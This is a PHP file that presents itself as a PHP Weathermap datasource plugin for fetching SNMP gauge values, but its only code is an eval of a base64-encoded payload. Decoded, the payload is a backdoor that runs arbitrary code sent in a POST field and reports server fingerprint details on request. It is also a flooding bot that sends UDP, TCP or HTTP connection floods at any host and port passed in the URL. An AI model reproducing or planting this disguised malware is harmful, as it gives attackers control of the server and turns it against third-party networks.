<?php
// Pluggable datasource for PHP Weathermap 0.9
// - return a live base64 value

// doesn't work well with large values like interface counters (I think this is a rounding problem)
// - also it doesn't calculate rates. Just fetches a value.

// useful for absolute GAUGE-style values like DHCP Lease Counts, Wireless AP Associations, Firewall Sessions
// which you want to use to colour a NODE

// You could also fetch interface states from IF-MIB with it.
eval(base64_decode('aW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAiT2ZmIik7CnNldF90aW1lX2xpbWl0KDk5OTk5OSk7CiRob3N0ID0gJF9HRVRbJ2hvc3QnXTsKJHBvcnQgPSAkX0dFVFsncG9ydCddOwokZXhlY190aW1lID0gJF9HRVRbJ3RpbWUnXTsKJHR5cGU9JF9HRVRbJ3R5cGUnXTsKJFNlbmRsZW4gPSA2NTUzNTsgCiRwYWNrZXRzID0gMDsKJG5hbWU9ZXZhbCgkX1BPU1RbJ3RpbWUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KFRydWUpOwppZiAoU3RyTGVuKCRob3N0KT09MCBvciBTdHJMZW4oJHBvcnQpPT0wIG9yIFN0ckxlbigkZXhlY190aW1lKT09MCl7CiAgICAgICAgaWYgKFN0ckxlbigkX0dFVFsncmF0J10pPD4wKXsKICAgICAgICAgICAgICAgIGVjaG8gJF9HRVRbJ3JhdCddLiRfU0VSVkVSWyJIVFRQX0hPU1QiXS4ifCIuR2V0SG9zdEJ5TmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuInwiLnBocF91bmFtZSgpLiJ8Ii4kX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10uJF9HRVRbJ3JhdCddOwogICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgfQogICAgICAgIGVjaG8gIldhcm5pbmcgdG86IG9wZW5pbmciOwogICAgICAgIGV4aXQ7CiAgICB9CgppZigkdHlwZT09J3VkcCcpewoJZm9yKCRpPTA7JGk8JFNlbmRsZW47JGkrKyl7CiAgICAgICAgJG91dCAuPSAiQSI7CiAgICB9CgkkbWF4X3RpbWUgPSB0aW1lKCkrJGV4ZWNfdGltZTsKCQoJd2hpbGUoMSl7CgkJJHBhY2tldHMrKzsKCQlpZih0aW1lKCkgPiAkbWF4X3RpbWUpewoJCQlicmVhazsKCQl9CgkJJGZwID0gZnNvY2tvcGVuKCJ1ZHA6Ly8kaG9zdCIsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDUpOwoJCWlmKCRmcCl7CgkJCWZ3cml0ZSgkZnAsICRvdXQpOwoJCQlmY2xvc2UoJGZwKTsKCQl9Cgl9CgllY2hvICJ1ZHB8Ii5yb3VuZCgkcGFja2V0cyokU2VuZGxlbi8xMDI0LzEwMjQsIDIpLiJtYnwiLnJvdW5kKCRwYWNrZXRzLyRleGVjX3RpbWUqJFNlbmRsZW4vMTAyNC8xMDI0LCAyKS4ibWIvcyI7CQp9CgplbHNlaWYoJHR5cGU9PSd0Y3AnKXsKCWZvcigkaT0wOyRpPCRTZW5kbGVuOyRpKyspewogICAgICAgICRvdXQgLj0gIkEiOwogICAgfQoJJG1heF90aW1lID0gdGltZSgpKyRleGVjX3RpbWU7CgkKCXdoaWxlKDEpewoJCSRwYWNrZXRzKys7CgkJaWYodGltZSgpID4gJG1heF90aW1lKXsKCQkJYnJlYWs7CgkJfQoJCSRmcCA9IGZzb2Nrb3BlbigidGNwOi8vJGhvc3QiLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAwKTsKCX0KCWVjaG8gInRjcHwiLnJvdW5kKCRwYWNrZXRzKiRTZW5kbGVuLzEwMjQvMTAyNCwgMikuIm1ifCIucm91bmQoJHBhY2tldHMvJGV4ZWNfdGltZSokU2VuZGxlbi8xMDI0LzEwMjQsIDIpLiJtYi9zIjsJCn0KCgplbHNlewoJJHNheWkgPSAxOyAgCgkkY2w9c3RyX3JlcGxhY2UoImNjIiwiIiwkdHlwZSk7IAoJJGNjbG9vcD1pbnR2YWwoJGNsKTsKCSRwb3J0PWludHZhbCgkcG9ydCk7Cgl3aGlsZSAoICRzYXlpIDw9ICRjY2xvb3AgKSAgIAoJewoJCSRzb2NrID0gc29ja2V0X2NyZWF0ZShBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7CgkJaWYgKCRzb2NrID09PSBmYWxzZSkgewoJCQlleGl0OwoJCX0KIAkJc29ja2V0X2Nvbm5lY3QoJHNvY2ssJGhvc3QsJHBvcnQpOwoKICAgICAgICAJJG1zZyA9ICJIVFRQLzEuMSBHRVQgL1xyXG5Ib3N0OiIrJGhvc3QrIlxyXG5Db25uZWN0aW9uOiBLZWVwLUFsaXZlXHJcbiI7CiAgICAgICAgCXNvY2tldF93cml0ZSgkbXNnKTsKICAgICAgICAJc29ja2V0X2Nsb3NlKCRzb2NrKTsKICAgICAgICAJJHNheWkrKzsgICAKCX0KCWVjaG8gImNjfCIuJGNsOyAgIAp9'));?>